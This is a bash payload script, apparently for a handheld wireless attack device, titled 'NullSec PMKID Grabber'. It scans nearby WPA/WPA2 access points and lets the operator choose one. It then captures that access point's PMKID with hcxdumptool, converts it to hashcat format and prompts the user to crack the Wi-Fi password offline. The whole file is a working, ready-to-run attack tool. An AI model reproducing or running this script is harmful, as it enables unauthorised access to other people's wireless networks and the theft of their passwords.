#!/bin/bash
# Title: NullSec PMKID Grabber
# Author: bad-antics
# Description: Clientless WPA/WPA2 attack using PMKID from first EAPOL message
# Category: nullsec

LOOT_DIR="/mmc/nullsec/captures"
mkdir -p "$LOOT_DIR"

PROMPT "PMKID GRABBER
━━━━━━━━━━━━━━━━━━━━━━━━━
Clientless WPA attack.
Captures PMKID from AP
without waiting for
handshake.

Press OK to scan."

MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && ERROR_DIALOG "No monitor interface!" && exit 1

# Check for hcxdumptool
if ! which hcxdumptool >/dev/null 2>&1; then
    ERROR_DIALOG "hcxdumptool not found!\nInstall: opkg install hcxdumptool"
    exit 1
fi

SPINNER_START "Scanning targets..."
rm -f /tmp/pmkid_scan*
timeout 15 airodump-ng "$MONITOR_IF" -w /tmp/pmkid_scan --output-format csv 2>/dev/null &
sleep 15
killall airodump-ng 2>/dev/null
SPINNER_STOP

declare -a TARGETS CHANS NAMES
idx=0
while IFS=',' read -r bssid x1 x2 channel x3 cipher auth power x4 x5 x6 x7 essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    cipher=$(echo "$cipher" | tr -d ' ')
    echo "$cipher" | grep -qi "CCMP\|TKIP" || continue
    essid=$(echo "$essid" | tr -d ' ' | head -c 16)
    [ -z "$essid" ] && essid="[Hidden]"
    TARGETS[$idx]="$bssid"
    CHANS[$idx]=$(echo "$channel" | tr -d ' ')
    NAMES[$idx]="$essid"
    idx=$((idx + 1))
    [ $idx -ge 8 ] && break
done < /tmp/pmkid_scan-01.csv

[ $idx -eq 0 ] && ERROR_DIALOG "No WPA targets found!" && exit 1

PROMPT "WPA Targets: $idx

$(for i in $(seq 0 $((idx-1))); do echo "$((i+1)). ${NAMES[$i]}"; done)

Select target number."

SEL=$(NUMBER_PICKER "Target (1-$idx):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac
SEL=$((SEL - 1))
[ $SEL -lt 0 ] && SEL=0
[ $SEL -ge $idx ] && SEL=$((idx - 1))

TARGET_BSSID="${TARGETS[$SEL]}"
TARGET_CH="${CHANS[$SEL]}"
TARGET_NAME="${NAMES[$SEL]}"
OUTFILE="$LOOT_DIR/pmkid_${TARGET_NAME}_$(date +%Y%m%d_%H%M%S)"

resp=$(CONFIRMATION_DIALOG "PMKID attack on:\n${TARGET_NAME}\n\nThis may take 1-2 min.\nProceed?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Capturing PMKID..."
iwconfig "$MONITOR_IF" channel "$TARGET_CH" 2>/dev/null
timeout 120 hcxdumptool -i "$MONITOR_IF" --filterlist_ap="$TARGET_BSSID" --filtermode=2 -o "${OUTFILE}.pcapng" 2>/dev/null
SPINNER_STOP

if [ -f "${OUTFILE}.pcapng" ] && [ -s "${OUTFILE}.pcapng" ]; then
    hcxpcapngtool "${OUTFILE}.pcapng" -o "${OUTFILE}.22000" 2>/dev/null
    PMKID_COUNT=$(wc -l < "${OUTFILE}.22000" 2>/dev/null || echo "0")
    PROMPT "PMKID CAPTURED!
━━━━━━━━━━━━━━━━━━━━━━━━━
Target: $TARGET_NAME
PMKIDs: $PMKID_COUNT
File: $(basename ${OUTFILE})

Crack with hashcat:
hashcat -m 22000"
else
    PROMPT "NO PMKID CAPTURED
━━━━━━━━━━━━━━━━━━━━━━━━━
Target may not support
PMKID. Try handshake
capture instead."
fi
